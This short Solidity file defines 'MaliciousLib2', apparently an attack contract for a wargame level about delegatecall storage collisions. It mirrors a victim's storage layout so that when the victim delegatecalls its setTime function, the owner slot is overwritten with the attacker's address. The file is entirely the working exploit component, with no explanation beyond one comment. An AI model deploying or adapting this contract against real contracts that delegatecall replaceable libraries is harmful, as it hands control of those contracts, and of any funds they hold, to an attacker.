pragma solidity ^0.8.0;
contract MaliciousLib2 {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 _time) public {
        // Set owner via delegatecall using msg.sender 
        owner = msg.sender;
    }
}
